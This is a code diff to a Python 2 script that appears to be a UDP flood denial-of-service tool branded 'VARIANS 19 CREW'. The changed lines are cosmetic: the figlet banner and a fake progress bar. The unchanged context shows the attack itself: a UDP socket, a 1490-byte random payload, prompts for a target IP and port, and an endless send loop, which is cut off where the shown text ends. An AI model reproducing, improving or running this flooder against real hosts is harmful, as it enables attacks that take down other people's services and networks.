@@ -16,10 +16,11 @@ year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
-os.system("clear")
-os.system("figlet MUSLIM HACKERS")
 
-    print                                "VARIANS 19 CREW"
+os.system("clear")
+os.system("figlet V-19 CREW")
+
+ print                                "VARIANS 19 CREW"
     print "         __     __       _     ___       __    ____    ___  _         _  "
     print "         \ \   / /      / |   / _ \     / _|  |  _ \  | __| \ \      / / "
     print "          \ \ / /_____  | |  | (_) |   | |    | |_) | | __|  \ \ /\ / /  "
@@ -30,7 +31,6 @@ os.system("figlet MUSLIM HACKERS")
     print                           "#WE ARE MALAYSIAN HACKER "
     print                           "#WE ARE MUSLIM HACKER"
 
-
 ip = raw_input("Masukkan IP Target : ")
 port = input  ("Masukkan Port      : ")
 
@@ -38,9 +38,13 @@ os.system("clear")
 os.system("figlet Attack Starting")
 print "[                    ] 0% "
 time.sleep(5)
-print "[##########          ] 50%"
+print "[=====               ] 25%"
 time.sleep(5)
-print "[####################] 100%"
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
 time.sleep(3)
 sent = 0
 while True:
